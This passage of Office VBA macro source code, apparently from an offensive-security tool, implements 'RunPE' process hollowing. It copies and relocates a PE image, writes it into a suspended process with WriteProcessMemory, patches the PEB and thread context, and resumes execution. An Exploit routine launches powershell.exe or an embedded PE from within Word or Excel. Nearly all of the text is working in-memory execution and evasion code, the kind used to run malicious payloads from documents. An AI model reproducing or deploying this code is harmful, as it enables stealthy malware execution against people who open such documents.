    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
    ' |__ In IMAGE_OPTIONAL_HEADER64, ImageBase is at offset 24
    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
        Dim lImageBaseAddrOffset As Long
        Dim ptrImageBase As LongPtr
        #If Win64 Then
            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
        #Else
            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
        #End If

        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value
        'Debug.Print ("Current image base: 0x" + Hex(ptrImageBase) + " - Image base to write: 0x" + Hex(ptrProcessImageBase))
        
        Call RtlMoveMemory(VarPtr(baImage(0 + lImageBaseAddrOffset)), VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS) ' Write new value
        
        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value to verify
        'Debug.Print ("New effective image base: 0x" + Hex(ptrImageBase))
    End If


    ' Allocate some memory in the current process to store the source image
    Debug.Print ("[*] Allocating memory for the source image in current process...")
    Dim ptrImageLocalCopy As LongPtr
    ptrImageLocalCopy = VirtualAlloc(0&, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If ptrImageLocalCopy = 0 Then
        Debug.Print ("    |__ VirtualAlloc() failed (Err:" + Str(Err.LastDllError) + ").")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ VirtualAlloc() OK - Got Addr: 0x" + Hex(ptrImageLocalCopy))
        End If
    End If
    
    
    ' Copy source image to local memory
    Debug.Print ("[*] Writing source image in current process...")
    If VERBOSE Then
        Debug.Print ("    |__ Target address: 0x" + Hex(ptrImageLocalCopy))

        Debug.Print ("[*] Writing PE headers...")
        Debug.Print ("    |__ Headers size:" + Str(structNTHeaders.OptionalHeader.SizeOfHeaders))
    End If
    Call RtlMoveMemory(ptrImageLocalCopy, VarPtr(baImage(0)), structNTHeaders.OptionalHeader.SizeOfHeaders)
    
    If VERBOSE Then
        Debug.Print ("[*] Writing PE sections...")
    End If
    Dim iCount As Integer
    Dim structSectionHeader As IMAGE_SECTION_HEADER
    For iCount = 0 To (structNTHeaders.FileHeader.NumberOfSections - 1)
        ' Nth section is at offset:
        '  0 (image base)
        '  + DOSHeader->e_lfanew  Image base address
        '  + 248 OR 264           IMAGE_NT_HEADERS size is 248 (32 bits) or 264 (64 bits)
        '  + N * 40               IMAGE_SECTION_HEADER is 40 (32 & 64 bits)
        Call RtlMoveMemory(VarPtr(structSectionHeader), VarPtr(baImage(structDOSHeader.e_lfanew + SIZEOF_IMAGE_NT_HEADERS + (iCount * SIZEOF_IMAGE_SECTION_HEADER))), SIZEOF_IMAGE_SECTION_HEADER)
        
        Dim strSectionName As String: strSectionName = ByteArrayToString(structSectionHeader.SecName)
        Dim ptrNewAddress As LongPtr: ptrNewAddress = ptrImageLocalCopy + structSectionHeader.VirtualAddress
        Dim lSize As Long: lSize = structSectionHeader.SizeOfRawData
        
        If VERBOSE Then
            Debug.Print ("    |__ Writing section: '" + strSectionName + "' (Size:" + Str(lSize) + ") at 0x" + Hex(ptrNewAddress))
        End If

        Call RtlMoveMemory(ptrNewAddress, VarPtr(baImage(0 + structSectionHeader.PointerToRawData)), lSize)
    Next iCount
    

    ' If the base address of the payload changed, we need to apply relocations
    Debug.Print ("[*] Applying relocations...")
    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
        
        Dim lMaxSize As Long: lMaxSize = structRelocDirectory.Size
        Dim lRelocAddr As Long: lRelocAddr = structRelocDirectory.VirtualAddress
        
        Dim structReloc As IMAGE_BASE_RELOCATION
        Dim lParsedSize As Long: lParsedSize = 0
        
        Do While lParsedSize < lMaxSize
        
            Dim ptrStructReloc As LongPtr: ptrStructReloc = ptrImageLocalCopy + lRelocAddr + lParsedSize
            Call RtlMoveMemory(VarPtr(structReloc), ptrStructReloc, SIZEOF_IMAGE_BASE_RELOCATION)
            lParsedSize = lParsedSize + structReloc.SizeOfBlock
            
            If (structReloc.VirtualAddress <> 0) And (structReloc.SizeOfBlock <> 0) Then
                If VERBOSE Then
                    Debug.Print ("    |__ Relocation Block: Addr=0x" + Hex(structReloc.VirtualAddress) + " - Size:" + Str(structReloc.SizeOfBlock))
                End If
                
                Dim lEntriesNum As Long: lEntriesNum = (structReloc.SizeOfBlock - SIZEOF_IMAGE_BASE_RELOCATION) / SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
                Dim lPage As Long: lPage = structReloc.VirtualAddress
                
                Dim ptrBlock As LongPtr: ptrBlock = ptrStructReloc + SIZEOF_IMAGE_BASE_RELOCATION
                Dim iBlock As Integer
                Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
                
                iCount = 0
                For iCount = 0 To (lEntriesNum - 1)
                    Dim iBlockType As Integer: iBlockType = ((iBlock And &HF000) / &H1000) And &HF ' type = value >> 12
                    Dim iBlockOffset As Integer: iBlockOffset = iBlock And &HFFF ' offset = value & 0xfff
                    'Debug.Print ("    |   |__ Block: Type=" + Str(iBlockType) + " - Offset=0x" + Hex(iBlockOffset))
                    
                    If iBlockType = 0 Then
                        Exit For
                    End If

                    Dim iPtrSize As Integer: iPtrSize = 0
                    If iBlockType = &H3 Then ' 32 bits address
                        iPtrSize = 4
                    ElseIf iBlockType = &HA Then ' 64 bits address
                        iPtrSize = 8
                    End If
                    
                    Dim ptrRelocateAddr As LongPtr
                    ptrRelocateAddr = ptrImageLocalCopy + lPage + iBlockOffset

                    If iPtrSize <> 0 Then
                        Dim ptrRelocate As LongPtr
                        Call RtlMoveMemory(VarPtr(ptrRelocate), ptrRelocateAddr, iPtrSize)
                        ptrRelocate = ptrRelocate - structNTHeaders.OptionalHeader.ImageBase + ptrProcessImageBase
                        Call RtlMoveMemory(ptrRelocateAddr, VarPtr(ptrRelocate), iPtrSize)
                    End If
                    
                    ptrBlock = ptrBlock + SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
                    Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
                    
                Next iCount
            End If
        Loop
    End If
    
    
    ' Write modified image to target process memory
    Debug.Print ("[*] Writing modified source image to target process memory...")
    Dim lWriteProcessMemory As Long
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrProcessImageBase, ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ WriteProcessMemory() OK")
        End If
    End If
    
    
    ' Free local memory
    Call VirtualFree(ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, &H10000) ' &H10000 = MEM_FREE
    
    
    ' Applying new image base address to target PEB
    Debug.Print ("[*] Applying new image base address to target PEB...")
    Dim ptrPEBImageBaseAddr As LongPtr
    #If Win64 Then
        ptrPEBImageBaseAddr = structContext.Rdx + 16
    #Else
        ptrPEBImageBaseAddr = structContext.Ebx + 8
    #End If
    
    If VERBOSE Then
        Debug.Print ("    |__ Image base address location: 0x" + Hex(ptrPEBImageBaseAddr))
        Debug.Print ("    |__ Image base address: 0x" + Hex(ptrProcessImageBase))
    End If
    
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrPEBImageBaseAddr, VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ WriteProcessMemory() OK")
        End If
    End If
    
    
    ' Overwrite context with new entry point
    Debug.Print ("[*] Overwriting context with new entry point...")
    Dim ptrEntryPoint As LongPtr: ptrEntryPoint = ptrProcessImageBase + structNTHeaders.OptionalHeader.AddressOfEntryPoint
    #If Win64 Then
        structContext.Rcx = ptrEntryPoint
    #Else
        structContext.Eax = ptrEntryPoint
    #End If
    
    If VERBOSE Then
        Debug.Print ("    |__ New entry point: 0x" + Hex(ptrEntryPoint))
    End If
    
    Dim lSetThreadContext As Long
    #If Win64 Then
        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
    #Else
        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
    #End If
    If lSetThreadContext = 0 Then
        Debug.Print ("    |__ SetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ SetThreadContext() OK")
        End If
    End If
    
    
    ' Resume thread
    ' |__ If ResumeThread succeeds, the return value is the thread's previous suspend count (i.e. 1 in this case)
    Debug.Print ("[*] Resuming suspended process...")
    Dim lResumeThread As Long
    lResumeThread = ResumeThread(structProcessInformation.hThread)
    If lResumeThread = 1 Then
        If VERBOSE Then
            Debug.Print ("    |__ ResumeThread() OK")
        End If
    Else
        Debug.Print ("    |__ ResumeThread() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    End If

    Debug.Print ("[+] RunPE complete!!!")
    
End Sub

' --------------------------------------------------------------------------------
' Method:    Exploit
' Desc:      Calls FileToByteArray to get the content of a PE file as a Byte
'               array and calls the RunPE procedure to execute it from the memory
'               of Word / Excel
' Arguments: N/A
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub Exploit()

    Debug.Print ("================================================================================")
    
    Dim strSrcFile As String
    Dim baSrcFileContent() As Byte
    Dim strSrcArguments As String
    Dim strSrcPE As String
    
    'strSrcFile = "C:\Windows\System32\cmd.exe"
    strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
    'strSrcFile = "C:\Windows\SysWOW64\cmd.exe"
    'strSrcFile = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    
    strSrcArguments = ""
    'strSrcArguments = "-exec Bypass"
    
    strSrcPE = PE()
    If strSrcPE = "" Then
        If Dir(strSrcFile) = "" Then
            Debug.Print ("[-] '" + strSrcFile + "' doesn't exist.")
            Exit Sub
        Else
            Debug.Print ("[*] Source file: '" + strSrcFile + "'")
            If VERBOSE Then
                Debug.Print ("    |__ Command line: " + strSrcFile + " " + strSrcArguments)
            End If
        End If
        baSrcFileContent = FileToByteArray(strSrcFile)
        Call RunPE(baSrcFileContent, strSrcArguments)
    Else
        Debug.Print ("[+] Source file: embedded PE")
        baSrcFileContent = StringToByteArray(strSrcPE)
        Call RunPE(baSrcFileContent, strSrcArguments)
    End If

End Sub
